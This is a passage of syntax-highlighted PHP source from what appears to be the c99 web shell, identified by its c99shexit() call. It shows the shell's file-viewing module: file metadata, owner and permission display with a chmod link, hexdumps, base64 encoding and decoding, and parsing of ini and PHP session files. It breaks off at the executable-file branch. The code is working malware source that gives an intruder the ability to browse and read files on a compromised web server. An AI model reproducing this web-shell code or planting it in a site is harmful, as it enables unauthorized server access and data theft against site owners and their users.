  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Viewing file:&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;) &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;Select action/file-type:&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$rft</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;font color=green&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$ft</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&amp;lt;u&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/u&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="k">echo</span> <span class="s2">&quot; |&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;info&quot;</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Information:&amp;lt;/b&amp;gt;&amp;lt;table border=0 cellspacing=1 cellpadding=2&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Path&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Size&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;MD5&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">md5_file</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Owner/Group&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="p">;</span>
    <span class="nv">$ow</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
    <span class="nv">$gr</span> <span class="o">=</span> <span class="nb">posix_getgrgid</span><span class="p">(</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
    <span class="k">echo</span> <span class="p">(</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
   <span class="p">}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Perms&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;chmod&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Create time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">filectime</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Access time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">fileatime</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;MODIFY time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
   <span class="nv">$fi</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;rb&quot;</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$fi</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$fullhexdump</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;FULL HEXDUMP&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="nv">$str</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$fi</span><span class="p">,</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));}</span>
    <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;HEXDUMP PREVIEW&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="nv">$str</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$fi</span><span class="p">,</span><span class="nv">$hexdump_lines</span><span class="o">*</span><span class="nv">$hexdump_rows</span><span class="p">);}</span>
    <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$a0</span> <span class="o">=</span> <span class="s2">&quot;00000000&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$a1</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="nv">$a2</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$a1</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">&quot;%02X&quot;</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;</span>
     <span class="k">switch</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span>
     <span class="p">{</span>
      <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>  <span class="nv">$a2</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;font&amp;gt;0&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">32</span><span class="o">:</span>
      <span class="k">case</span> <span class="mi">10</span><span class="o">:</span>
      <span class="k">case</span> <span class="mi">13</span><span class="o">:</span> <span class="nv">$a2</span> <span class="o">.=</span> <span class="s2">&quot;&amp;nbsp;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
      <span class="k">default</span><span class="o">:</span> <span class="nv">$a2</span> <span class="o">.=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
     <span class="p">}</span>
     <span class="nv">$n</span><span class="o">++</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$n</span> <span class="o">==</span> <span class="nv">$hexdump_rows</span><span class="p">)</span>
     <span class="p">{</span>
      <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span> <span class="p">{</span><span class="nv">$a0</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">&quot;%08X&quot;</span><span class="p">,</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="nv">$a1</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
      <span class="nv">$a2</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
     <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">//if ($a1 != &quot;&quot;) {$a0 .= sprintf(&quot;%08X&quot;,$i).&quot;&amp;lt;br&amp;gt;&quot;;}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td bgcolor=#666666&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$a0</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=000000&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$a1</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=000000&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$a2</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="nv">$encoded</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$base64</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Base64 Encode&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
   <span class="p">}</span>
   <span class="k">elseif</span><span class="p">(</span><span class="nv">$base64</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Base64 Encode + Chunk&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">chunk_split</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)));</span>
   <span class="p">}</span>
   <span class="k">elseif</span><span class="p">(</span><span class="nv">$base64</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Base64 Encode + Chunk + Quotes&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
    <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;!.{1,76}!&quot;</span><span class="p">,</span><span class="s2">&quot;&#39;&#39;.</span>
<span class="s2">&quot;</span><span class="p">,</span><span class="nv">$encoded</span><span class="p">),</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="k">elseif</span><span class="p">(</span><span class="nv">$base64</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="nv">$text</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
    <span class="nv">$encoded</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Base64 Decode&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">)</span> <span class="o">!=</span> <span class="nv">$text</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; (failed)&quot;</span><span class="p">;}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">))</span>
   <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;textarea cols=80 rows=10&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$encoded</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;HEXDUMP:&amp;lt;/b&amp;gt;&amp;lt;nobr&amp;gt; [&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;info&#39;;document.todo.fullhexdump.value=&#39;1&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Full&amp;lt;/a&amp;gt;] [&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;info&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Preview&amp;lt;/a&amp;gt;]&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Base64: &amp;lt;/b&amp;gt;</span>
<span class="s2">&amp;lt;nobr&amp;gt;[&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;info&#39;;document.todo.base64.value=&#39;1&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Encode&amp;lt;/a&amp;gt;]&amp;nbsp;&amp;lt;/nobr&amp;gt;</span>
<span class="s2">&amp;lt;nobr&amp;gt;[&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;info&#39;;document.todo.base64.value=&#39;2&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;+chunk&amp;lt;/a&amp;gt;]&amp;nbsp;&amp;lt;/nobr&amp;gt;</span>
<span class="s2">&amp;lt;nobr&amp;gt;[&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;info&#39;;document.todo.base64.value=&#39;3&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;+chunk+quotes&amp;lt;/a&amp;gt;]&amp;nbsp;&amp;lt;/nobr&amp;gt;</span>
<span class="s2">&amp;lt;nobr&amp;gt;[&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;info&#39;;document.todo.base64.value=&#39;4&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Decode&amp;lt;/a&amp;gt;]&amp;nbsp;&amp;lt;/nobr&amp;gt;</span>
<span class="s2">&amp;lt;P&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;html&quot;</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$white</span><span class="p">)</span> <span class="p">{</span><span class="o">@</span><span class="nb">ob_clean</span><span class="p">();}</span>
   <span class="k">echo</span> <span class="nv">$r</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$white</span><span class="p">)</span> <span class="p">{</span><span class="nx">c99shexit</span><span class="p">();}</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;txt&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;ini&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nb">parse_ini_file</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="k">TRUE</span><span class="p">));</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;phpsess&quot;</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span>
   <span class="nv">$v</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">);</span>
   <span class="k">echo</span> <span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
   <span class="nb">var_dump</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;exe&quot;</span><span class="p">)</span>
  <span class="p">{</span>
